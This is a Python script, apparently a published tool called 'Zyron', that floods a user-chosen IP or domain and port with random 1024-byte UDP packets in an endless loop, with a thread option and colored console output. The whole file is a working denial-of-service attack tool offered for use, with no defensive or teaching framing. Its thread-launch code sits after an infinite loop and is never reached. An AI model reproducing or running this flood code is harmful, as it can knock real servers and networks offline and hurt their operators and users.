import os
import random
import sys
import socket
import threading
import ipaddress
import time

os.system('clear' if os.name == 'posix' else 'cls')

def colored_text(text, color):
    RESET = '\033[0m'
    return f"{color}{text}{RESET}"

def yellow_text(text):
    return colored_text(text, '\033[93m')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def run(ip_run, port_run, times_run, threads_run):
    data_run = random._urandom(1024)
    try:
        while True:
            print(" " * 50 + "\033[1;31m\033[0m \033[1mPacket sent to\033[0m "f"\033[1;38;2;255;100;100m{ip_run}\033[0m"":"f"\033[1;38;2;255;100;100m{port_run}\033[1;37m""")
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))
            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()
    except KeyboardInterrupt:
        print("\n" + " " * 50 + "\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
        sys.exit(0)
    except Exception as e:
        sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")

text = yellow_text("""
                                        ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄ ▄▄    ▄ 
                                        █       █  █ █  █   ▄  █ █       █  █  █ █
                                        █▄▄▄▄   █  █▄█  █  █ █ █ █   ▄   █   █▄█ █
                                         ▄▄▄▄█  █       █   █▄▄█▄█  █ █  █       █
                                        █ ▄▄▄▄▄▄█▄     ▄█    ▄▄  █  █▄█  █  ▄    █
                                        █ █▄▄▄▄▄  █   █ █   █  █ █       █ █ █   █
                                        █▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄█  █▄█▄▄▄▄▄▄▄█▄█  █▄▄█
""")

datas = """
                                                     Author: Weaky 
                                                    Version: 1.0.2A
                                         GitHub: https://github.com/weakyi/zyron  
"""

# "1.0.2A" ve "Weaky" değerlerini sarıya dönüştürme
datas = datas.replace("1.0.2A", yellow_text("1.0.2A")).replace("Weaky", yellow_text("Weaky")).replace("https://github.com/weakyi/zyron", yellow_text("https://github.com/weakyi/zyron"))

print(text)
time.sleep(0.000000000000000000000000001)
print(datas)


def main():
    while True:
        try:
            target = input("\033[1;31m\033[0m ""\033[1;37mEnter IP or domain-->\033[0m ")
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid target IP or domain.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)
            
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(f"\033[1;31m[+]\033[0m Resolved \033[1;38;2;255;100;100m{target}\033[0m to \033[1;38;2;255;100;100m{ip}\033[1;37m")
        except socket.error as e:
            print("\033[1;31m[!]\033[0m \033[1;37mError resolving the target: {}\033[0m".format(e))
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input("\033[1;31m\033[0m ""\033[1;37mEnter port--> \033[0m "))
            break
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the port.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            times_input = input("\033[1;31m\033[0m ""\033[1;37mEnter packets per connection--> \033[0m ")
            if times_input.strip():  
                
                times = int(times_input)
                break
            
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the packets.\033[0m")
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the packets.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            threads_input = input("\033[\033[0m ""\033[1;37mEnter threads--> \033[0m ")
            if threads_input.strip():
                
                threads = int(threads_input)
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the threads.\033[0m")
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the threads.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript closed by user, Exiting.\033[0m")
            sys.exit(0)

    
    data = random._urandom(1024)
    i = random.choice(("\033[1;31m\033[0m", "\033[1;31m[!]\033[0m", "\033[1;31m\033[0m"))
    error_occurred = False
    
    try:
        while True:
            print(i +" \033[1mPacket sent to\033[0m "f"\033[1;38;2;255;100;100m{ip}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            s.close()

    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m ""\033[1;37mScript closed by user, Exiting.\033[0m""")
        sys.exit(0)

    except Exception as e:
        if not error_occurred:
            error_occurred = True
            sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")
                
    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads))
        th.start()

if __name__ == "__main__":
    main()
